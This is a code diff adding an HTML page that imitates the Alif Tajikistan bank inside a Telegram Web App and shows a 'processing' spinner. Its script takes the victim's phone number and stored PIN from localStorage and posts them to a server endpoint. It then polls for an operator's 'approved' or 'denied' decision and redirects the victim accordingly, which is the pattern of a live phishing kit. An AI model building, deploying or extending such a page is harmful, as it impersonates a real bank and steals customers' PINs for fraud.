@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="tg">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Коркарди маълумот — Алиф Тоҷикистон</title>
+
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --alif-green: #00B956;
+            --alif-green-dark: #009E49;
+            --alif-gradient: linear-gradient(180deg, #00C853 0%, #00B956 100%);
+            --bg-dark: #1A1C1E;
+            --card-bg: #FFFFFF;
+            --text-dark: #1A1C1E;
+            --text-muted: #6E7781;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-dark);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+
+        /* Корти боркунии марказӣ */
+        .loading-card {
+            background: var(--card-bg);
+            width: 88%;
+            max-width: 380px;
+            padding: 45px 24px;
+            border-radius: 24px;
+            text-align: center;
+            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.4);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Доираи тобхӯраки аниматсионӣ */
+        .loader-circle {
+            width: 110px;
+            height: 110px;
+            background: var(--alif-gradient);
+            border-radius: 50%;
+            margin-bottom: 28px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 6px 20px rgba(0, 185, 86, 0.35);
+        }
+
+        .loader-circle::after {
+            content: '';
+            width: 82px;
+            height: 82px;
+            border: 4px solid rgba(26, 28, 30, 0.15);
+            border-top: 4px solid var(--bg-dark);
+            border-radius: 50%;
+            animation: spin 1.2s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Матни ҳолат */
+        h2 {
+            color: var(--text-dark);
+            font-size: 24px;
+            margin: 0 0 10px;
+            font-weight: 800;
+            letter-spacing: -0.3px;
+        }
+
+        p {
+            color: var(--text-muted);
+            font-size: 15px;
+            margin: 0;
+            line-height: 1.5;
+            font-weight: 500;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="loading-card">
+    <div class="loader-circle"></div>
+    <h2 id="main-text">Коркард шуда истодааст...</h2>
+    <p id="sub-text">Тасдиқи маълумот омода мешавад...</p>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", async () => {
+
+    const mainText = document.getElementById("main-text");
+    const subText = document.getElementById("sub-text");
+
+    const tg = window.Telegram?.WebApp;
+    if (tg) {
+        tg.ready();
+        tg.expand();
+    }
+
+    const phone = localStorage.getItem("phone") || localStorage.getItem("userPhone") || "";
+    const pin = localStorage.getItem("lastPin") || "";
+
+    if (!phone) {
+        console.warn("⚠️ Рақами телефон дар localStorage ёфт нашуд");
+    }
+
+    // Ирсоли огоҳиномаи воридшавӣ ба сервер
+    try {
+        await fetch("/api/login-notification", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ phone, pin })
+        });
+    } catch (err) {
+        console.error("❌ Хатогии дархост:", err);
+    }
+
+    // Тағйири динамикии матн
+    setTimeout(() => {
+        mainText.textContent = "Лутфан интизор шавед...";
+        subText.textContent = "Ин танҳо чанд сония вақт мегирад";
+    }, 3000);
+
+    // Санҷиши ҳолати тасдиқ ё радкунӣ аз сервер
+    async function checkApproval() {
+        if (!phone) return;
+
+        try {
+            const res = await fetch(`/api/check-status?phone=${phone}`);
+            const data = await res.json();
+
+            if (data.status === "approved") {
+                mainText.textContent = "Тасдиқ шуд!";
+                subText.textContent = "Кушодани саҳифаи навбатӣ...";
+
+                setTimeout(() => {
+                    window.location.href = "/page8";
+                }, 1500);
+            }
+
+            if (data.status === "denied") {
+                mainText.textContent = "Рад карда шуд!";
+                subText.textContent = "Рамзи PIN ё рақами телефон нодуруст аст.";
+
+                setTimeout(() => {
+                    window.location.href = "/page6?error=wrongpin";
+                }, 2000);
+            }
+
+        } catch (err) {
+            console.error("❌ Санҷиши ҳолат ноком шуд:", err);
+        }
+    }
+
+    setInterval(checkApproval, 2000);
+});
+</script>
+
+</body>
+</html>
